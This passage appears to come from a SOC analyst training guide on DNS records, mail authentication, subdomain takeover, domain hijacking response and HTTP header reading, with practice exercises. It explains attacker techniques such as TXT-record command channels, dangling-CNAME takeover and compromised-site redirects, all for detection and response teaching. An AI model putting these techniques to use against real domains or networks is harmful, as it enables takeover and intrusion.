  • [.] is the "defang" convention so nobody clicks by accident — use it when writing malicious domains in reports.
  • A malicious domain pointing at 127.0.0.1 or 0.0.0.0 is not harmless — it may be parked (dormant) or sinkholed. An internal PC still looking it up is still infected.
  • Investigate past incidents with records from that time (our DNS logs, passive DNS), not today's answer. Write "this IP as of HH:MM" in your notes.

docs.title: Checklist before blocking an IP
docs.text:
• How many internal hosts talk to this IP? (1–2: consider; hundreds: don't)
  • Per WHOIS/ASN, is it shared infrastructure — Cloudflare, AWS, Google, Microsoft, Akamai?
  • Do our DNS logs / passive DNS show other (legitimate) domains on the same IP?
  • If there were several answer IPs, did you check them all — and which one was actually connected to?
  • Would a domain block (DNS sinkhole / DNS firewall) be enough?
  • If you block, did you set an expiry (30–90 days) and record the reason (case number, date, owner)?

2026 view

  • CDN growth means a malicious domain is far more likely to sit on a shared IP. For web threats, IP blocking fits less and less; domain blocking is the default.
  • With ECH, network devices struggle to tell sites on the same IP apart by name. The reliable enforcement points are the DNS layer and the endpoint (EDR).
  • Attackers use legitimate services (GitHub, Google Drive, Telegram) for C2 — Living off Trusted Sites. Domain and IP are both genuine, so detect on behaviour.
  • An IP block with no expiry breaks things six months later when the IP is reassigned to a partner.
  • Before feed-driven auto-blocking (SOAR), add an allow list of major cloud/CDN ranges and an automatic "how many internal hosts talk to this" check.

docs.title: TXT — a box for text
docs.text: TXT attaches arbitrary text to a domain. It is central to mail anti-spoofing and domain-ownership proof — and also a covert channel for attackers.

docs.title: Basics
docs.text:
• Any printable ASCII; binary is base64-encoded first.
  • A name can have several TXT records.
  • [Correction] The "255-character limit" applies to each quoted string. A record can hold several strings that are concatenated — that is how 400+ character DKIM keys fit.

docs.title: The three mail-authentication records
docs.text:
Name Where What it checks Example SPF TXT on the domain May this server send mail as this domain? v=spf1 include:_spf.google.com ip4:203.0.113.10 -all DKIM TXT at <selector>._domainkey.<domain> Has the content been tampered with? (signature) v=DKIM1; k=rsa; p=MIIB... DMARC TXT at _dmarc.<domain> Policy on failure + alignment with the visible From v=DMARC1; p=reject; rua=mailto:...
  • SPF terminators: -all reject, ~all soft-fail, ?all neutral, +all anyone (worst).
  • DMARC policy: none report only, quarantine spam folder, reject reject. rua reports show who is spoofing your domain.
  • [Correction] "SPF records start with spf=" is a common mistake — SPF starts with v=spf1.
  • [Added] DMARC is just as essential. In February 2024 Google and Yahoo made SPF + DKIM + DMARC mandatory for bulk senders, and Microsoft followed for Outlook.com in 2025.

docs.title: Reading an SPF/DKIM pass
docs.text:
• What it means: sent from an authorised server (SPF), content unchanged (DKIM).
  • Trap 1: pass for which domain? The attacker's micros0ft-billing.com passes for itself.
  • Trap 2: SPF checks the envelope sender (Return-Path), which can differ from the visible From — DMARC alignment closes that gap.
  • Trap 3: a compromised genuine account (BEC) passes SPF, DKIM and DMARC.
  • Bottom line: authentication confirms identity, not intent.

docs.title: Domain-ownership proof
docs.text: Services hand you a string to publish as TXT (facebook-domain-verification=..., MS=..., google-site-verification=...). [Added] These records reveal which SaaS the company uses — useful recon for tailored phishing. Remove them for services you no longer use.

docs.title: Why attackers abuse it
docs.text: It can hold anything, DNS is almost always open, and mail servers make TXT lookups common enough not to stand out. An infected PC asks for the TXT of cmd.evil-c2.xyz and gets a base64 command back. Many TXT lookups from an ordinary (non-mail) PC are suspicious — detection is covered in DNS abuse.

docs.title: CNAME and subdomain takeover
docs.text: CNAME says "this name is an alias — go and ask that name instead". Neglect it and an attacker can take over a company address.

docs.title: Basics
docs.text:
• Ask for A and you get the CNAME plus the canonical name's A (CNAME chasing).
  • Canonical name = the name in the answer. The name you asked is the alias. This is the most-missed exam point.
  • Uses: pointing several names at one server, and today mostly handing off to external services (shop.mycompany.com → mycompany.myshopify.com).
  • CNAMEs pointing at each other loop forever. In practice CDNs create 3–4-step chains, so read the whole response chain to see the final destination.
  • Ordinary PCs rarely query type CNAME directly (they ask for A and get the CNAME as a bonus).

docs.title: Dangling CNAME → subdomain takeover
docs.text:
1. promo.mycompany.com CNAME mycompany-event.herokuapp.com hosts an event page.
  2. After the event the Heroku app is deleted, but the CNAME stays.
  3. The target now returns NXDOMAIN — "this spot is free, anyone can take it".
  4. The attacker creates an app with the same name → attacker content on the genuine company address (credential phishing, malware, fake notices).

Training users to "check the domain in the address bar" does not help, because the address is genuine.

docs.title: When you find one
docs.text:
• Quickly confirm with the owning team whether the service is still in use (don't let it sit for days)
  • Delete the CNAME (first choice). If still needed, re-create the target name yourself to claim the spot
  • Check whether any other CNAME is already taken over (normal response, content we never made)
  • Audit every CNAME pointing outside: *.azurewebsites.net, *.cloudapp.azure.com, *.herokuapp.com, *.s3.amazonaws.com, *.github.io, *.myshopify.com
  • Process rule: when retiring a service, delete the DNS record first, then the service

Cloud providers have added protections such as TXT-based ownership checks, but I'm not certain they cover every service and setting, so cleaning up on our side is the dependable defence. Products that automate this audit are called EASM (external attack surface management).

2026 view

  • With cloud and SaaS everywhere, subdomain takeover is much more common than a few years ago.
  • CNAME can't be used at the zone apex (mycompany.com); the HTTPS/SVCB record's AliasMode fills that gap.
  • CNAME cloaking: ad/tracking vendors hide behind first-party names like metrics.mycompany.com that CNAME to them. "Company address" may not mean "company server".

docs.title: MX, SRV, NS
docs.text: Simple concepts, each with one security risk attached: MX — mail interception, SRV — internal recon, NS — full domain takeover.

docs.title: MX — mail servers
docs.text:
• Mail delivery in three steps: look up the recipient domain's MX → look up that name's A → SMTP to port 25 on that IP.
  • The number in front is preference — lower goes first; equal numbers load-balance.
  • MX must point at an FQDN with A/AAAA. No bare IPs, no CNAMEs.
  • [Correction] The often-cited RFC 974 is superseded by RFC 5321 (same rule).
  • Security clues: mass MX lookups from an ordinary PC = spambot; a phishing domain's MX shows intent (none = click-only, Gmail/Outlook = wants replies, self-hosted = infrastructure lead); a change to our MX = mail-interception emergency.
  • [Added] For domains that never send mail: Null MX (MX 0 ., RFC 7505) + v=spf1 -all + DMARC p=reject stops spoofing.

docs.title: SRV — service location
docs.text:
• Format _service._proto.name (underscores separate it from host names).
  • Answer: priority weight port target, e.g. 0 100 389 dc01.corp.local. — it even gives you the port.
  • Key AD queries: _ldap._tcp.dc._msdcs.<domain> (domain controllers), _kerberos._tcp.<domain> (authentication), _gc._tcp.<domain> (Global Catalog).
  • SRV lookups should only be visible on the internal network → if they leave, your internal domain name leaks.
  • Recon signals: many SRV types in a short burst, at night, from a device that never does it (printer, server), from an odd process. But an MFP may legitimately use LDAP for scan-to-email address books, so compare to baseline.
  • MFPs and IP cameras patch slowly and have no EDR, making them attacker footholds.

docs.title: NS — the name of the server with the answers
docs.text:
• NS lives in two places: a referral copy at the parent TLD (entered at your registrar) and the master on the authoritative server.
  • Why: you can't ask the authoritative server if you don't know who it is — the parent's copy breaks the chicken-and-egg problem.
  • If the two differ: lame delegation (a cause of intermittent resolution failures).

docs.title: Domain hijacking (NS takeover)
docs.text:
Point NS at an attacker server and the attacker controls A, MX and TXT — and can pass TXT ownership checks to get a genuine HTTPS certificate in the company's name. The main route is not hacking DNS but taking over the registrar account. Real examples: the 2018–2019 Sea Turtle and DNSpionage campaigns against government and telco domains; in 2024 the "Sitting Ducks" pattern (hijacking domains whose DNS-provider account no longer exists) was published.

Response order after an incident:

  1. Recover: restore NS at the registrar. If you can't log in, use the registrar's emergency contact (have it ready beforehand).
  2. Lock down: change passwords, kill all sessions, MFA, Registry Lock, check whether the account's contact email was changed.
  3. Ride out: for the NS TTL (e.g. 172800 s = 2 days) some resolvers still go to the attacker even after recovery.
  4. Find the damage: check crt.sh (Certificate Transparency) for rogue certificates and revoke them; assume mail and password-reset emails during the window were intercepted and review key accounts.
  5. Notify: tell customers, partners and staff to re-verify any requests from that window (especially bank-detail changes).

Prevention: registrar MFA, Registry Lock, change alerts on NS/MX/SPF, DNSSEC (useless on its own if the account is taken). When retiring a service, clean up DNS first. Before an incident the first control is MFA; after an incident the first action is recovery.

docs.title: Reading packets — DNS on the wire
docs.text:
A capture mixing A, CNAME and PTR query/response pairs (client IP and transaction IDs are illustrative).

No. Source         Destination    Info
1   192.168.1.156  1.1.1.1        Standard query 0x1a2b A example.com
2   1.1.1.1        192.168.1.156  Standard query response 0x1a2b A example.com A 1.2.3.4 A 162.255.119.240
3   192.168.1.156  1.1.1.1        Standard query 0x3c4d CNAME mail.google.com
4   1.1.1.1        192.168.1.156  Standard query response 0x3c4d CNAME mail.google.com CNAME googlemail.l.google.com
5   192.168.1.156  1.1.1.1        Standard query 0x5e6f PTR 27.208.194.173.in-addr.arpa
6   1.1.1.1        192.168.1.156  Standard query response 0x5e6f PTR 27.208.194.173.in-addr.arpa PTR ql-in-f27.1e100.net

docs.title: How to read it
docs.text:
• query = question, query response = answer. The answer line repeats the question, then the answers.
  • Same ticket (0x...) = one pair.
  • In a response line, each type label starts one answer (three As on line 2 = the question + two answers).
  • Wireshark filters: dns, dns.flags.response == 0 (questions only), dns.qry.type == 12 (PTR only).

docs.title: Questions and answers
docs.text: Question Answer Point 1. Domain looked up with A example.com Right after the type label in the query 2. Resolved IPs 1.2.3.4, 162.255.119.240 Two — one alone is wrong. 1.2.3.4 is a placeholder → a domain owner can publish any IP 3. Canonical name of Google's mail host googlemail.l.google.com Canonical = the name in the answer 4. IP looked up via PTR 173.194.208.27 Reverse the octets 5. DNS server used 1.1.1.1 (Cloudflare) The query destination — but the capture only shows the PC ↔ 1.1.1.1 leg 6. (Bonus) Problem if this is a corporate PC Bypassing company DNS to use an external resolver No logs, domain blocking defeated, internal names leak. Block outbound 53 + alert on attempts. With DoH it wouldn't even look like this

docs.title: MX → A → PTR investigation flow
docs.text: The IP in question 4 came from gmail.com MX → gmail-smtp-in.l.google.com → A 173.194.208.27 → PTR ql-in-f27.1e100.net. Forward and reverse names differ — another "don't trust PTR" example. Use the same order (MX → A → compare with the sending IP in the headers) to check whether a phishing email's sending server is genuine.

docs.title: HTTP
docs.text:
In one line

Web pages, email, messaging and malware all ride on HTTP. Reading one request line and a handful of headers properly catches a surprising number of web shells, phishing pages and C2 beacons. In 2026, though, almost all web traffic is HTTPS, so paths, parameters and headers now come mainly from proxy (TLS inspection), web server, WAF and EDR logs.

docs.title: Reading order
docs.text: # Page Key content 1 Web Servers, URLs and GET Order-and-delivery model, document root, web shells with Event 4688 / Sysmon 1, module backdoors, URL anatomy (@, #, %, file://), Zeek http.log, GET logging, SQL injection, path traversal, C2 beacons, practice questions 2 POST, Other Methods and Request Headers POST and logging, malware and web-shell POSTs, CONNECT/HEAD/OPTIONS/PUT/DELETE/TRACE, Host, User-Agent, Referer, Cookie, Accept, X-Forwarded-For, header-order fingerprints, practice questions 3 Judging Requests Field-by-field checklist, random-but-normal strings, dissecting an Angler exploit-kit request, domain shadowing, URLs inside a Referer (Google Translate, Safe Links), ClickFix and translate.goog phishing, practice questions 4 Response Headers and Status Codes Server, Date, Content-Type, Content-Length, Last-Modified, Set-Cookie, Location, Content-Disposition, magic bytes, 1xx–5xx from a SOC view, reading a silent 407, an 8-byte response, practice questions 5 Header Reading Practice Reading one request and one response with a question list, non-standard ports and compromised-forum redirects, IE8 vs Edge IE mode, Content-Type vs Content-Encoding, decompressing gzip by hand, practice questions 6 New HTTP Standards and Wrap-up HTTP/2 streams, frames, HPACK and pseudo-headers, following an HTTP/2 transaction in Wireshark, HTTP/3/QUIC and Zeek quic.log, UDP 443 policy, SMB over QUIC, WebSocket, HTTP section wrap-up, practice questions

docs.title: Ten things to remember
docs.text:
1. A web server is file sharing. The URL path maps onto a disk path, and one file dropped into an executable folder becomes a web shell.
  2. Web-shell signal: the web server process spawns cmd.exe / powershell.exe (4688, Sysmon 1).
  3. Read domains right to left. In a URL, whatever follows @ is the real destination, and anything after # never reaches the logs.
  4. Decode % encoding and Base64. Wrapping is not encryption.
  5. GET puts data in the address, POST puts it in the body. The address gets logged; the body usually doesn't.
  6. Not in the log ≠ didn't happen. Look for host logs, WAF and full packet capture.
  7. Inbound PUT + 2xx + executable file type = check for a web-shell upload first.
  8. Anyone can fake User-Agent and X-Forwarded-For. Trust only values your own devices added.
  9. A cookie is a login wristband. Steal it and MFA doesn't help.
  10. Look at patterns (interval, order, surrounding requests), not single lines. Don't block CDN IPs — block the domain.

docs.title: Header Reading Practice — One Request, One Response
Header Reading Practice — One Request, One Response
docs.text:
What this page covers

Putting request- and response-header knowledge to work on one realistic request and one realistic response. For the request: site, port and file, where the user came from, what they were looking at, browser and OS, and the user's language. For the response: success, file type, server software, size, time, and "it says HTML, so why does it look like garbage?" Includes decompressing gzip by hand. Practice questions with answers are at the end.

Labels

[Added] = practical must-know, [Changed]/[Caution] = what changed recently and what is risky if done the old way. What each header means is on POST, Other Methods and Request Headers and Response Headers and Status Codes. All domains in the examples are invented.

docs.title: Eight key points
docs.text:
1. Read with a question list: where to (Host, port, path) → where from (Referer) → what about (Referer and path content) → with what (User-Agent) → who (Accept-Language).
  2. A non-default port appears in Host (:85). Non-standard port + random path + unfamiliar domain = stacked signals.
  3. If the Referer is an ordinary site (a forum, say) and the next destination is suspicious, first suspect the ordinary site was compromised and injected a redirect.
  4. Trident/4.0 is IE8; Trident/7.0 is IE11 (and Edge's IE mode).
  5. Accept-Language hints at the user's language; it isn't evidence of nationality or location.
  6. Content-Encoding: gzip in a response means the body is compressed. Looking like garbage is normal; decompress to get the original.
  7. gzip data starts with 1F 8B. See those magic bytes, decompress first.
  8. A very old server version (e.g. a decade-old nginx) signals an unmaintained server — possibly compromised, or attacker infrastructure.

docs.title: Exercise 1: reading request headers
docs.text:
A request sent by a staff PC:

GET /Kq3vZ8pLwX1mR7tNc0YbA5eHs2Uj9DfGq HTTP/1.1
Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, */*
Referer: http://www.fitness-forum-training.example/showthread.php?95-Lumbar-Flexion-when-squatting
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)
Accept-Encoding: gzip, deflate
Host: quietmeadow-ledger.example:85
Connection: Keep-Alive

Answer these five:

  1. Which site, port and file is the user accessing?
  2. Which site sent the user to this new site?
  3. What content was the user looking at?
  4. What browser and OS is the client using?
  5. What language does the user probably speak?
Answer and explanation

1. Site, port, file. Host shows quietmeadow-ledger.example on port 85 — not HTTP's default 80, so :85 is included in Host. The file is the long random string after GET: /Kq3vZ8pLwX1mR7tNc0YbA5eHs2Uj9DfGq. Joining Host and path gives http://quietmeadow-ledger.example:85/Kq3vZ8pLwX1mR7tNc0YbA5eHs2Uj9DfGq. Non-standard port, random path and unfamiliar domain all stack up.

2. Referring site. Per the Referer, the user was just on www.fitness-forum-training.example.

3. What they were viewing. The Referer path showthread.php?95-Lumbar-Flexion-when-squatting is a workout-forum thread about lumbar flexion when squatting. Jumping from an ordinary forum post to a randomly named site on a non-standard port is odd. Two interpretations:

  • The forum was compromised and an automatic redirect (hidden iframe, injected script) was planted → the user was dragged along without clicking anything; the classic first step of the exploit-kit era
  • The user clicked a link in the post → someone planted a malicious link in a post or comment

Either way, suspect the forum itself.

4. Browser and OS. MSIE 8.0 and Trident/4.0 = Internet Explorer 8; Windows NT 6.1 = Windows 7. Browsers of that era were prime drive-by targets because of plugin vulnerabilities. The Accept values application/x-ms-application and application/xaml+xml are also typical of IE then, consistent with the User-Agent — this looks like the victim's real browser, not a fake.

5. Language. Accept-Language: en-US → most likely an English (US) speaker. It's only a browser language setting, not evidence of nationality or location.

Overall: "ordinary forum → random domain, non-standard port, random path" is the shape of a malicious redirect via a compromised site. Next, check this request's response (what was received), the following requests (any further downloads), and other staff who visited the same forum.

docs.title: [Added] Seeing an IE-style User-Agent in 2026
docs.text:
IE8 on Windows 7 can't appear on a 2026 corporate PC, but the word Trident still can. Microsoft Edge has an IE mode for legacy internal systems, and pages opened in it send an IE11-style User-Agent:

Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; .NET4.0C; .NET4.0E; rv:11.0) like Gecko

Trident/7.0 and rv:11.0 mark IE11. So Trident isn't automatically suspicious: first check whether the destination is a legacy internal system registered for IE mode, or an external site. An IE-mode User-Agent heading to an unfamiliar external site is either a faked value or out-of-policy use.

docs.title: Exercise 2: reading response headers
docs.text:
A response returned by a server:

HTTP/1.1 200 OK
Server: nginx/0.7.67
Date: Tue, 29 Oct 2013 04:05:56 GMT
Content-Type: text/html
Content-Length: 2182
Connection: keep-alive
Content-Encoding: gzip

<binary-looking bytes: 1f 8b 08 00 00 00 00 00 00 03 ...>

Answer these six:

  1. Was the page returned successfully?
  2. What type of file was returned?
  3. What software is the server running?
  4. How big is the file?
  5. When was the response sent?
  6. It says HTML — why doesn't the content look like HTML?
Answer and explanation

1. Success. 200 OK on the first line.

2. File type. Content-Type: text/html → the server claims an HTML page.

3. Server software. Server: nginx/0.7.67 → nginx 0.7.67, a very old version from around 2010. Two implications:

  • The version isn't hidden and hasn't been updated in over a decade — likely an unmaintained server, possibly already compromised and serving malicious content
  • Or attacker infrastructure hastily stood up from old images or tooling

4. Size. Content-Length: 2182 → 2,182 bytes — but that's the compressed size; it's larger once decompressed.

5. Time sent. Date: Tue, 29 Oct 2013 04:05:56 GMT → 29 October 2013, 04:05:56 UTC (15:05:56 Sydney daylight time). Plausible for an old packet capture. If traffic captured today showed a server date years off, the server's clock is broken (an abandoned server) or the value is deliberately faked.

6. Why it doesn't look like HTML — Content-Encoding: gzip. The server gzip-compressed the HTML. Content-Type describes the original content once unpacked; Content-Encoding describes how it's currently packed. Raw on the wire it looks like binary garbage, which is normal. The first bytes 1f 8b are gzip's magic bytes. To extract and analyse the file you must decompress it first (see Decompressing gzip).

docs.title: [Added] Content-Type vs Content-Encoding
docs.text:
As a parcel:

Header Analogy Example Content-Type What item is in the box text/html = a web page Content-Encoding How the item was packed gzip = vacuum-packed

The request's Accept-Encoding: gzip, deflate is the customer saying "you can vacuum-pack it, I can open that"; the response's Content-Encoding: gzip is the kitchen replying "so I did". Brotli (br) and Zstandard (zstd), which compress better than gzip, are now common too.

docs.title: [Added] Decompressing gzip by hand
docs.text:
Most analysis tools (Wireshark's "Export Objects → HTTP", Zeek, …) decompress gzip automatically, but if you carved bytes out of a capture yourself, you'll have to do it by hand.

First confirm it's gzip from the first bytes:

$ od -An -tx1 -N16 body.bin
 1f 8b 08 00 00 00 00 00 00 03 b3 c9 28 c9 cd b1
  • od — Linux command that dumps a file byte by byte
  • -An — omit the offset column on the left
  • -tx1 — print one byte at a time in hex
  • -N16 — only the first 16 bytes
  • 1f 8b is the gzip magic; the following 08 is the compression method (deflate)

Then decompress:

$ python3 -c "import gzip; print(gzip.decompress(open('body.bin','rb').read()).decode())"
<html><body>hello analyst</body></html>
  • python3 -c "..." — run the quoted Python as a one-liner
  • open('body.bin','rb').read() — read the file as raw bytes
  • gzip.decompress(...) — undo the gzip compression
  • .decode() — turn bytes into text for display
  • Result: the original HTML

On Linux gunzip -c body.bin works too, as does CyberChef's "Gunzip". Handle suspicious files only in an isolated analysis environment.

docs.title: 2026 perspective
docs.text:
[Still valid in 2026]

Reading requests and responses with a question list, tracing "where from" via Referer, and checking Content-Encoding first and decompressing before analysis all still hold.

[Changed]

  • More compression schemes. Besides gzip and deflate, Brotli (br) is very common on the web, and Zstandard (zstd) has started appearing in major browsers and CDNs. If your tool can't decode the scheme the content looks garbled, so check Content-Encoding first.
  • In HTTP/2 and HTTP/3 the headers themselves are compressed (HPACK, QPACK). That's separate from body compression (Content-Encoding); reading the headers needs a tool that understands the version.
  • IE-family User-Agents have nearly vanished, but Edge IE mode's Trident/7.0 still shows up on access to legacy internal systems.

[Caution] Wrong or risky if done the old way

  • Content-Length is the compressed size. The decompressed size and file hash differ from the compressed form. When comparing with threat-intel hashes, hash the decompressed file.
  • Don't infer an attacker's nationality from Accept-Language. It's a browser setting, and attack tools can send anything.
  • Don't wave through an ordinary-looking Referer such as a forum. Compromised legitimate sites are a frequent starting point for malicious redirects.

docs.title: Question 1
docs.text:
This User-Agent appears from a company PC. Should it be treated as malicious automatically? What would you check?

Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; .NET4.0C; .NET4.0E; rv:11.0) like Gecko
Answer and explanation

Not automatically. Trident/7.0 and rv:11.0 are IE11-shaped, and in 2026 that mostly means Edge's IE mode. Many organisations register legacy internal systems (old HR or approval systems) to open in IE mode.

Check:

  1. The destination — an internal system registered for IE mode, or an external site?
  2. If it's an unfamiliar external site → out-of-policy use or a faked User-Agent (malware or a tool)
  3. The process that made the connection (Sysmon Event ID 3) — msedge.exe, or something else?

docs.title: Question 2
docs.text:
A response has only Content-Type: text/html and no Content-Encoding header, yet the body starts with 1F 8B. What's odd, and what should you do?

Answer and explanation

1F 8B is gzip's magic. Normally the server would add Content-Encoding: gzip so the browser knows to decompress it and show HTML. Without it, a browser sees "broken HTML" — so this response is probably not a page meant for a person in a browser.

Two possibilities:

  • A server misconfiguration (rare, but it happens)
  • Compressed data disguised as HTML for a malicious program to unpack itself → extra malware or configuration fetched by a downloader

Do: carve out the body, decompress it, check the magic bytes of the result again (e.g. MZ) → hash it and check reputation → identify the requesting process (Sysmon Event ID 3) and User-Agent on that PC. It's the same "declared type ≠ real content" signal as in response headers.

docs.title: Question 3
docs.text:
Like Exercise 1, several staff PCs show requests from an ordinary workout forum (Referer) to a random domain. What should you do about the forum?

Answer and explanation

Several staff following the same pattern from the same forum points to a compromised forum with an injected redirect (more likely than everyone clicking the same link).

  1. Scope: use proxy and DNS logs to find every staff member who visited the forum and the PCs that went on to the suspicious domain
  2. Next stage: what those PCs received (response Content-Type, resp_mime_types, size) and whether new processes or files appeared afterwards
  3. Analyse the forum page: fetch the page source only in an isolated analysis environment and look for injected scripts or hidden iframes (never open it on a company PC)
  4. Block: the redirect destination domain; decide on temporarily blocking the forum itself by weighing business impact and risk
  5. Notify: tell the forum operator it has been compromised

docs.title: New HTTP Standards — HTTP/2, HTTP/3/QUIC, WebSocket, and HTTP Wrap-up
New HTTP Standards — HTTP/2, HTTP/3/QUIC, WebSocket, and HTTP Wrap-up
docs.text:
What this page covers

Why HTTP/2 exists and what changed (numbered streams in one connection, HEADERS and DATA frames, binary format, HPACK header compression, effectively mandatory encryption, server push), following one HTTP/2 transaction in Wireshark, HTTP/3 and QUIC (TCP+TLS rebuilt on UDP), reading Zeek quic.log, how organisations handle QUIC, the WebSocket handshake and detection, and a wrap-up of the whole HTTP section. Practice questions with answers are at the end.

Labels

[Added] = practical must-know, [Correction] = fixes a commonly stated mistake, [Changed]/[Caution] = what changed recently and what is risky if done the old way. The earlier pages are listed on the HTTP overview.

docs.title: Ten key points
docs.text:
1. HTTP/2 and HTTP/3 keep the meaning (methods, paths, headers, status codes); only the delivery changed.
  2. HTTP/2 interleaves many numbered streams inside one TCP connection. One transaction = IP + TCP connection + stream ID.
  3. Request/response headers travel in HEADERS frames and bodies in DATA frames. Headers are binary and HPACK-compressed, so "Follow TCP Stream" can't read them.
  4. HTTP/2 header names are lowercase, and the request line and Host become pseudo-headers such as :method, :path, :authority, :scheme, :status.
  5. Browsers only use HTTP/2 over encrypted connections. Seeing content needs TLS inspection or session keys.
  6. Server push (sending files without a request) has effectively disappeared after browsers turned it off.
  7. HTTP/3 runs on QUIC over UDP 443. Encryption is built into the protocol, so there's no separate TCP or TLS to look at.
  8. You can still read the SNI from QUIC's first (Initial) packet, unless ECH is used — Zeek quic.log's server_name.
  9. Many organisations block outbound UDP 443 so browsers fall back to TCP+TLS that existing inspection tools can see.
  10. WebSocket turns into a long-lived two-way channel after 101 Switching Protocols; what follows the handshake barely appears in HTTP logs.

docs.title: Why it exists
docs.text:
HTTP/1.1 exchanges one thing at a time per connection: the next answer can't arrive until the previous one is done — one counter, one queue. Browsers coped by opening several connections per site (typically around six), and pages with dozens of images and scripts got slow.

Google's experimental fix was SPDY ("speedy"), refined into HTTP/2 (standardised in 2015, revised as RFC 9113 in 2022). Two goals: faster, and encrypted by default — good for users, harder for analysts who used to read plain text.

docs.title: What changed
docs.text:
If HTTP/1.1 is "one counter, one queue", HTTP/2 is "one conveyor belt carrying numbered boxes, mixed together".

Change HTTP/1.1 HTTP/2 Connections Several TCP connections per site Usually one TCP connection Concurrency One at a time per connection Many numbered streams interleaved Unit Text requests/responses Frames: HEADERS for headers, DATA for bodies Format Human-readable text Binary Headers As-is HPACK-compressed (repeated headers sent as index numbers) Encryption Optional Optional in the standard, but browsers use it only over TLS Server push None Server may send files unrequested (now effectively retired)

Streams and frames. Each request in the connection gets a stream ID (client-initiated streams are odd: 1, 3, 5, …). The request headers go out in a HEADERS frame with that number; response headers and body come back in HEADERS and DATA frames with the same number. Frames from different streams are interleaved, so isolating one transaction takes IP + TCP connection + stream ID.

Common frame types:

Frame Purpose HEADERS Request/response headers DATA Body (file content) SETTINGS Exchange connection settings (at start) WINDOW_UPDATE Flow control: "you may send more" PING Check the connection is alive RST_STREAM Cancel one stream GOAWAY Announce connection shutdown PUSH_PROMISE Announce a server push

docs.title: Special fields instead of text: pseudo-headers
docs.text:
HTTP/1.1's request line (GET /path HTTP/1.1) and Host become colon-prefixed pseudo-headers in HTTP/2.

HTTP/1.1                              HTTP/2 (decoded)
GET /images/logo.png HTTP/1.1         :method: GET
Host: www.example.com                 :path: /images/logo.png
                                      :authority: www.example.com
                                      :scheme: https
User-Agent: Mozilla/5.0 ...           user-agent: Mozilla/5.0 ...

HTTP/1.1 200 OK                       :status: 200
Content-Type: image/png               content-type: image/png
  • :method = method, :path = path, :authority = the Host equivalent, :scheme = http/https
  • The response's first line is just :status — no reason phrase like "OK"
  • Regular header names are all lowercase (user-agent, content-type)

[Added] Where detection rules break. Rules or regexes looking for a literal capitalised "User-Agent:" can miss decoded HTTP/2 traffic. Compare header names case-insensitively.

docs.title: What it looks like: upgrading to cleartext HTTP/2
docs.text:
Browsers only use HTTP/2 inside TLS, but cleartext HTTP/2 (h2c) is in the standard too. Starting on HTTP/1.1 and upgrading is the classic example of status 101.

No.  Info
1    GET / HTTP/1.1   (Upgrade: h2c, HTTP2-Settings: ...)
2    HTTP/1.1 101 Switching Protocols
3    Magic, SETTINGS[0]
4    SETTINGS[0], WINDOW_UPDATE[0]
5    HEADERS[1]: 200 OK
6    DATA[1]
7    HEADERS[3]: GET /style.css
8    HEADERS[5]: GET /logo.png
9    HEADERS[3]: 200 OK, DATA[3]
10   HEADERS[5]: 200 OK, DATA[5]
  1. The client requests the first page over HTTP/1.1 and asks "may we switch to HTTP/2?" with Upgrade: h2c
  2. The server agrees with 101 Switching Protocols
  3. The client sends the HTTP/2 preface (Magic) and its SETTINGS (stream 0 = the whole connection)
  4. The server sends its settings and a flow-control update 5–6. The first request's answer arrives on stream 1 as HEADERS and DATA 7–8. Two more requests go out together on streams 3 and 5 9–10. Answers come back per stream number (order may interleave)

Instead of one tidy "200 OK", you follow frame names and stream numbers.

docs.title: Following one HTTP/2 transaction in Wireshark
docs.text:
With a decrypted (or cleartext) HTTP/2 capture:

http2
http2.type == 1
http2.streamid == 19
tcp.stream == 4 && http2.streamid == 19
  • Line 1: HTTP/2 packets only
  • Line 2: HEADERS frames only (frame type numbers: DATA = 0, HEADERS = 1) → the list of request/response headers
  • Line 3: stream 19 only
  • Line 4: stream 19 of TCP connection 4 only → one transaction (other connections can also have a stream 19, hence the connection number)

Expanding a HEADERS frame shows, in the packet details pane:

HyperText Transfer Protocol 2
  Stream: HEADERS, Stream ID: 19, Length 52, GET /images/logo.png
    Header: :method: GET
    Header: :path: /images/logo.png
    Header: :authority: www.example.com
    Header: :scheme: https
    Header: user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) ...

Because of HPACK, "Follow TCP Stream" shows only garbled bytes. Use Wireshark's Follow → HTTP/2 Stream instead to read one stream's headers and body.

[Added] Seeing encrypted HTTP/2 in a lab. If the SSLKEYLOGFILE environment variable is set, browsers write TLS session keys to that file. Point Wireshark's Preferences → Protocols → TLS → "(Pre)-Master-Secret log filename" at it and the capture decrypts to show HTTP/2. That key file unlocks every encrypted session from that period, so use it only in a lab and delete it securely. At organisational scale, a TLS-inspecting proxy plays the same role.

docs.title: Server push
docs.text:
The server guesses "whoever views this page will need this CSS" and sends files before being asked. For analysts, that meant files arriving with no request record.

[Changed] It delivered less than hoped and caused problems; Chrome disabled it by default in 2022 and other browsers followed, so it has effectively disappeared. 103 Early Hints (an interim response hinting "fetch these files early") replaced it — and since the browser still fetches the files with its own requests, request records remain.

docs.title: What it is
docs.text:
HTTP/2 still carries everything over one TCP connection, so when one packet is lost, every stream stalls until TCP retransmits it. Google built a new transport on UDP instead of TCP: QUIC (originally "Quick UDP Internet Connections", now just a name). Google's design document describes it as very similar to TCP+TLS+HTTP/2, but implemented on top of UDP. It became a standard as RFC 9000 in 2021, and HTTP running on QUIC is HTTP/3 (RFC 9114, 2022).

Layer HTTP/1.1 and HTTP/2 HTTP/3 Application HTTP HTTP/3 Security TLS (separate layer) TLS 1.3 built into QUIC Transport TCP QUIC Below IP UDP (usually port 443) → IP

It doesn't change what HTTP says; it's closer to rebuilding layer 4 (transport). So the familiar traces — TCP three-way handshake, TCP retransmissions, a plaintext TLS handshake — aren't there.

docs.title: How browsers know to use HTTP/3
docs.text:
Browsers don't start on UDP. They usually learn "this site also speaks HTTP/3" in one of two ways:

Alt-Svc: h3=":443"; ma=86400
  • An Alt-Svc header on the first (TCP+TLS, HTTP/2) response: "HTTP/3 (h3) is also available on UDP 443 here; remember this for 86,400 seconds (a day)"
  • Or the DNS HTTPS record (type 65) announces alpn="h3,h2" up front

If UDP is blocked, browsers quietly fall back to TCP+TLS — which leads to the organisational approach below.

docs.title: What you can still see: QUIC's first packet and Zeek quic.log
docs.text:
